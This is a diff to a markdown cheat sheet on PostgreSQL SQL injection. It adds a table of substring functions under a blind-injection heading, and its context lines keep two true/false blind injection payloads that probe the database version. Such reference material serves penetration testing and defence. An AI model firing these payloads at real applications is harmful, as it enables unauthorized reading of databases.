@@ -15,6 +15,7 @@
 * [PostgreSQL Error Based](#postgresql-error-based)
     * [PostgreSQL XML Helpers](#postgresql-xml-helpers)
 * [PostgreSQL Blind](#postgresql-blind)
+    * [PostgreSQL Blind With Substring Equivalent](#postgresql-blind-with-substring-equivalent)
 * [PostgreSQL Time Based](#postgresql-time-based)
 * [PostgreSQL Out of Band](#postgresql-out-of-band)
 * [PostgreSQL Stacked Query](#postgresql-stacked-query)
@@ -119,10 +120,21 @@ Note, with the above queries, the output needs to be assembled in memory. For la
 
 ## PostgreSQL Blind
 
+### PostgreSQL Blind With Substring Equivalent
+
+| Function    | Example                                         |
+| ----------- | ----------------------------------------------- | 
+| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |
+| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        | 
+| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` | 
+
+Examples:
+
 ```sql
 ' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
 ' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
 ```
+
 
 ## PostgreSQL Time Based
 
